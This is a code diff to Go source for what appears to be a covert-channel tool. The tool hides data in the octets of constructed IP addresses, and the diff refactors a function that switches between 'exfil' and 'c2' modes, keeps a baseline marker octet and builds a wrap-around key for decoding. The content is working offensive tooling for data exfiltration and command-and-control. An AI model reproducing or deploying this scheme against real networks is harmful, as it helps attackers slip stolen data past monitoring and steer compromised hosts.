@@ -98,18 +98,17 @@ func resolveAddr(address string, bl *int) {
 }
 
 func send_data(set_baseline bool, octets []byte, bl *int, mode ...*string) {
-
-	// Create an empty beginning octet
-	var beginning_octet string
-
 	// Create an empty variable in which to hold the entire address
 	var constructed string
 
 	// If sending baseline, set the first octet to "172" (pre-defined baseline signifier), fill the next two octets with random values, and store the baseline in the last octet.
 	if set_baseline {
-		if *mode[0] == "exfil" {
+
+		// Distinguish between "exfil" and "c2" modes
+		switch *mode[0] {
+		case "exfil":
 			octets = append(octets, byte(172))
-		} else {
+		case "c2":
 			octets = append(octets, byte(185))
 		}
 		// Set a baseline between 30 to 100
@@ -121,14 +120,17 @@ func send_data(set_baseline bool, octets []byte, bl *int, mode ...*string) {
 		constructed = fmt.Sprintf("%v.%v.%v.%v", octets[0], octets[1], octets[2], octets[3])
 
 	} else {
+		// Create an empty beginning octet
+		var beginning_octet string
 
-		// For each byte of data, check if the integer representation of the byte added to the baseline will go above 255; if so, Go will 'loop' the value back around to 0 using mod 256. If this will occur, set the
-		// digit in the octet at the corresponding index of the 'flipped' octet to 2, and otherwise to 1. In doing this, we create the 'key' that will be used to determine whether we have to 'flip' the value back when
+		// For each byte of data, check if the integer representation of the byte added to the baseline will go above 255; if so, Go will wrap the value back around to 0 using mod 256. If this will occur, set the
+		// digit in the octet at the corresponding index of the wrapped octet to 2, and otherwise to 1. In doing this, we create the 'key' that will be used to determine whether we have to wrap the value back when
 		// decoding the received address.
 		for i := 0; i < len(octets); i++ {
+			// If the value will be wrapped around, set a 2.
 			if uint16(octets[i])+uint16(*bl) > 255 {
 				beginning_octet += "2"
-			} else {
+			} else { // Otherwise, set a 1.
 				beginning_octet += "1"
 			}
 
